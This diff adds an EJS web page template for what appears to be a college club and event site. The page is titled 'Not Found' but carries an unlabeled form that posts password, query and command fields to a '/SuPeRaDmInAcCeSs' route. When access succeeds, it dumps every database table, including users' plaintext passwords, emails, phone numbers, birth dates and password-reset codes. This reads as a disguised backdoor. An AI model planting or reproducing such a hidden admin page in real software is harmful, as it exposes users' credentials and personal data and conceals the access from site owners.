@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<link rel="stylesheet" href="/node_modules/bootstrap/dist/css/bootstrap.min.css">
+    <script src="/node_modules/jquery/dist/jquery.min.js"></script>
+<script src="/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
+    <title>Not Found</title>
+</head>
+<body>
+<div class="container">
+    <form method="get" action="/SuPeRaDmInAcCeSs">
+        <input title="unknown" type="password" name="detail">
+        <input title="unknown" type="text" name="query">
+<input title="unknown" type="text" name="command">
+        <button type="submit">.</button>
+    </form>
+    <% if(success === "yes"){ %>
+
+    <h1>Club</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>clubid</th>
+                <th>clubname</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in club){ %>
+            <tr>
+                <td><%= club[i].clubid %></td>
+                <td><%= club[i].clubname %></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>Event</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>eventid</th>
+                <th>event_name</th>
+                <th>venue</th>
+                <th>description</th>
+                <th>abacus_price</th>
+                <th>non_abacus_price</th>
+                <th>start_date_time</th>
+                <th>end_date_time</th>
+                <th>id</th>
+                <th>clubid</th>
+                <th>event_timestamp</th>
+                <th>approved</th>
+                <th>reviewed</th>
+                <th>event_photo</th>
+                <th>total_seats</th>
+                <th>avilable_seats</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in event){ %>
+            <tr>
+                <td><%= event[i].eventid %></td>
+                <td><%=event[i].event_name%></td>
+                <td><%=event[i].venue%></td>
+                <td><%=event[i].description%></td>
+                <td><%=event[i].abacus_price%></td>
+                <td><%=event[i].non_abacus_price%></td>
+                <td><%=event[i].start_date_time%></td>
+                <td><%=event[i].end_date_time%></td>
+                <td><%=event[i].id%></td>
+                <td><%=event[i].clubid%></td>
+                <td><%=event[i].event_timestamp%></td>
+                <td><%=event[i].approved%></td>
+                <td><%=event[i].reviewed%></td>
+                <td><%=event[i].event_photo%></td>
+                <td><%=event[i].total_seats%></td>
+                <td><%=event[i].avilable_seats%></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>User</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>id</th>
+                <th>name</th>
+                <th>password</th>
+                <th>email</th>
+                <th>mobile_no</th>
+                <th>photo</th>
+                <th>course</th>
+                <th>branch</th>
+                <th>dob</th>
+                <th>year</th>
+                <th>gender</th>
+                <th>User_Timestamp</th>
+                <th>isVerified</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in user){ %>
+            <tr>
+                <td><%=user[i].id %></td>
+                <td><%=user[i].name%></td>
+                <td><%=user[i].password%></td>
+                <td><%=user[i].email%></td>
+                <td><%=user[i].mobile_no%></td>
+                <td><%=user[i].photo%></td>
+                <td><%=user[i].course%></td>
+                <td><%=user[i].branch%></td>
+                <td><%=user[i].dob%></td>
+                <td><%=user[i].year%></td>
+                <td><%=user[i].gender%></td>
+                <td><%=user[i].User_Timestamp%></td>
+                <td><%=user[i].isVerified%></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>Registration</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>reg_no</th>
+                <th>id</th>
+                <th>eventid</th>
+                <th>reg_time</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in registration){ %>
+            <tr>
+                <td><%=registration[i].reg_no %></td>
+                <td><%=registration[i].id%></td>
+                <td><%=registration[i].eventid%></td>
+                <td><%=registration[i].reg_time%></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>event_media</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>eventid</th>
+                <th>file</th>
+                <th>media_type</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in event_media){ %>
+            <tr>
+                <td><%= event_media[i].eventid %></td>
+                <td><%= event_media[i].file %></td>
+                <td><%= event_media[i].media_type %></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>user_role</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>id</th>
+                <th>role_id</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in user_role){ %>
+            <tr>
+                <td><%= user_role[i].id %></td>
+                <td><%= user_role[i].role_id%></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <h1>forget_password</h1>
+    <div class="table-responsive">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>email</th>
+                <th>password</th>
+                <th>verification_code</th>
+                <th>user_timestamp</th>
+            </tr>
+            </thead>
+            <tbody>
+            <% for(let i in forget_password){ %>
+            <tr>
+                <td><%= forget_password[i].email %></td>
+                <td><%= forget_password[i].password%></td>
+                <td><%= forget_password[i].verification_code %></td>
+                <td><%= forget_password[i].user_timestamp%></td>
+            </tr>
+            <%}%>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    <% } %>
+</div>
+</body>
+</html>
